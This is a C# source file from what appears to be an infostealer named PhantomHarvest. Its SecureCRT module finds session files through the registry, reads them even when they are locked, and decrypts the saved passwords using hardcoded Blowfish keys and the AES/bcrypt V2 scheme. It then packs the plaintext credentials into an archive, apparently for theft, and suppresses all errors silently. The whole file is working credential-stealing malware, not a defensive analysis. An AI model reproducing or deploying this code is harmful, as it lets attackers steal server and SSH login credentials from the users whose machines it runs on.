using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Tools
{
	internal class SecureCRT
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string info = SecureCRT.GetInfo();
				if (!string.IsNullOrEmpty(info))
				{
					using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(info)))
					{
						zip.AddStream(ArchiveManager.Compression.Deflate, SecureCRT.ToolName + "/Sessions.txt", ms, DateTime.Now, "");
					}
				}
			}
			catch
			{
			}
		}

		public static string DecryptV2(string input, string passphrase = "")
		{
			string result;
			try
			{
				if (!input.StartsWith("02") && !input.StartsWith("03"))
				{
					result = "";
				}
				else
				{
					bool flag = input.StartsWith("03");
					input = input.Substring(3);
					byte[] array = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(passphrase));
					byte[] array2 = new byte[16];
					byte[] array3 = SecureCRT.fromhex(input);
					if (flag)
					{
						byte[] array4 = new byte[array3.Length - 16];
						byte[] array5 = new byte[16];
						Array.Copy(array3, 0, array5, 0, 16);
						Array.Copy(array3, 16, array4, 0, array3.Length - 16);
						array3 = array4;
						byte[] sourceArray = new Bcrypt().BcryptPbkdf("", array5, 16U, 48);
						array = new byte[32];
						Array.Copy(sourceArray, 0, array, 0, 32);
						Array.Copy(sourceArray, 32, array2, 0, 16);
					}
					byte[] array6;
					using (MemoryStream memoryStream = new MemoryStream())
					{
						using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
						{
							rijndaelManaged.KeySize = 256;
							rijndaelManaged.BlockSize = 128;
							rijndaelManaged.Key = array;
							rijndaelManaged.IV = array2;
							rijndaelManaged.Mode = CipherMode.CBC;
							rijndaelManaged.Padding = PaddingMode.Zeros;
							using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
							{
								cryptoStream.Write(array3, 0, array3.Length);
								cryptoStream.Close();
							}
							array6 = memoryStream.ToArray();
						}
					}
					if (array6.Length < 4)
					{
						result = "";
					}
					else
					{
						int num = BitConverter.ToInt32(new byte[]
						{
							array6[0],
							array6[1],
							array6[2],
							array6[3]
						}, 0);
						if (array6.Length < 4 + num + 32)
						{
							result = "";
						}
						else
						{
							byte[] array7 = new byte[num];
							byte[] array8 = new byte[32];
							byte[] array9 = new byte[32];
							Array.Copy(array6, 4, array7, 0, num);
							Array.Copy(array6, 4 + num, array8, 0, 32);
							using (SHA256 sha = SHA256.Create())
							{
								array9 = sha.ComputeHash(array7);
							}
							if (array9.Length != array8.Length)
							{
								result = "";
							}
							else
							{
								for (int i = 0; i < array9.Length; i++)
								{
									if (array9[i] != array8[i])
									{
										return "";
									}
								}
								result = Encoding.UTF8.GetString(array7);
							}
						}
					}
				}
			}
			catch
			{
				result = "";
			}
			return result;
		}

		private static byte[] fromhex(string hex)
		{
			byte[] array = new byte[int.Parse(Math.Ceiling((double)hex.Length / 2.0).ToString())];
			for (int i = 0; i < array.Length; i++)
			{
				int num = (2 <= hex.Length) ? 2 : hex.Length;
				array[i] = Convert.ToByte(hex.Substring(0, num), 16);
				hex = hex.Substring(num, hex.Length - num);
			}
			return array;
		}

		public static string Decrypt(string str)
		{
			byte[] iv = new byte[8];
			byte[] key = new byte[]
			{
				36,
				166,
				61,
				222,
				91,
				211,
				179,
				130,
				156,
				126,
				6,
				244,
				8,
				22,
				170,
				7
			};
			byte[] key2 = new byte[]
			{
				95,
				176,
				69,
				162,
				148,
				23,
				217,
				22,
				198,
				198,
				162,
				byte.MaxValue,
				6,
				65,
				130,
				183
			};
			byte[] array = SecureCRT.fromhex(str);
			if (array.Length <= 8)
			{
				return null;
			}
			Blowfish blowfish = new Blowfish();
			blowfish.InitializeKey(key);
			blowfish.SetIV(iv);
			byte[] array2 = new byte[array.Length];
			blowfish.DecryptCBC(array, 0, array.Length, array2, 0);
			array2 = array2.Skip(4).Take(array2.Length - 8).ToArray<byte>();
			Blowfish blowfish2 = new Blowfish();
			blowfish2.InitializeKey(key2);
			blowfish2.SetIV(iv);
			blowfish2.DecryptCBC(array2, 0, array2.Length, array, 0);
			return Encoding.Unicode.GetString(array).Split(new char[1])[0];
		}

		public static string GetInfo()
		{
			StringBuilder stringBuilder = new StringBuilder();
			string name = "Software\\VanDyke\\SecureCRT";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
			if (registryKey == null)
			{
				return "";
			}
			string path = Path.Combine(registryKey.GetValue("Config Path").ToString(), "Sessions");
			if (Directory.Exists(path))
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles("*.ini", SearchOption.AllDirectories))
				{
					if (!fileInfo.Name.ToLower().Equals("__FolderData__.ini".ToLower()))
					{
						byte[] fileBytes = LockedFile.ReadLockedFile(fileInfo.FullName);
						if (fileBytes == null) continue;
						
						string[] lines = Encoding.UTF8.GetString(fileBytes).Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
						foreach (string text in lines)
						{
							if (text.IndexOf('=') != -1)
							{
								string text2 = text.Split(new char[]
								{
									'='
								})[0];
								string text3 = text.Split(new char[]
								{
									'='
								})[1];
								if (text2.ToLower().Contains("S:\"Password\"".ToLower()))
								{
									stringBuilder.AppendLine("S:\"Password\"=" + SecureCRT.Decrypt(text3));
								}
								else if (text2.ToLower().Contains("S:\"Password V2\"".ToLower()))
								{
									stringBuilder.AppendLine("S:\"Password V2\"=" + SecureCRT.DecryptV2(text3, ""));
								}
								else
								{
									stringBuilder.AppendLine(text);
								}
							}
						}
					}
				}
			}
			return stringBuilder.ToString();
		}

		public static string ToolName = "SecureCRT";
	}
}
